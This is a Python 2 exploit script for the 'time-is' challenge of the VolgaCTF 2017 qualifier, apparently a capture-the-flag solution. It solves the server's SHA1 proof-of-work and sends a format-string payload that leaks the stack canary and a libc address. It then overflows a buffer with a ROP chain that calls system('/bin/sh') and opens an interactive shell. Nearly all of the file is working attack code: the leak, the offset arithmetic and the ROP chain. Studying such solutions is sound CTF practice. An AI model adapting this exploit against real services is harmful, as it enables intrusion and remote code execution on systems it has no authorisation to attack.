import socket, struct, os, binascii, base64, hashlib
import telnetlib   

try:
    import psyco; psyco.full()
except ImportError:
    pass

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def find_sol(src):
    for a in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
     for b in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
      for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
       for d in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for e in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            cand = src+a+b+c+d+e
            t = hashlib.sha1(cand).hexdigest()
            if t.endswith("ffffff") and t[-7] in ("37bf"):
                print "found", cand, t
                return cand
                
    print "NO SOL FOUND"
    exit()
    
def solvechall(sc):
    # Solve a puzzle: find an x such that 26 last bits of SHA1(x) are set, len(x)==29 and x[:24]=='e7f0de3f783bd45adcef43ed'
    res = readline(sc)
    src = res.split("x[:24]=='")[1].split("'")[0]
    print src
    sc.send(find_sol(src) + "\n")

sc = socket.create_connection(("time-is.quals.2017.volgactf.ru", 45678))
solvechall(sc)
offset_libc_return = 0x0000000000020830
offset_binsh = 0x000000000018C177
offset_system = 0x0000000000045390

# sc = socket.create_connection(("10.0.0.97", 12345))
# offset_libc_return = 0x0000000000021B45
# offset_binsh = 0x0000000000163708
# offset_system = 0x0000000000041490

readline(sc, False)
sc.send("%d" * 267 + "|%p" * 64 + "\n")
res = readline(sc, False)
res = res.split("|")
canary = int(res[1][2:], 16)
addr_libc_return = int(res[9][2:], 16)
addr_libc_base = addr_libc_return - offset_libc_return
print hex(canary), hex(addr_libc_base)

# readline(sc, False)
# sc.send("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p|%s|%s|xxx" + Q(0x0000000000603048) + Q(0x0000000000603058) + "\n")
# res = readline(sc)
# res = res.split("|")
# addr_libc_time = struct.unpack("<Q", res[1].ljust(8, "\x00"))[0]
# addr_libc_gmtime = struct.unpack("<Q", res[2].ljust(8, "\x00"))[0]
# print hex(addr_libc_time), hex(addr_libc_gmtime)

rop_poprdi_retn = 0x0000000000400BA3

rop = "X" * 0x808 + Q(canary) + "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG" + Q(rop_poprdi_retn) + Q(addr_libc_base + offset_binsh) + Q(addr_libc_base + offset_system)

readline(sc, False)
sc.send(rop + "\n")
readline(sc, False)
sc.send("q\n")

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    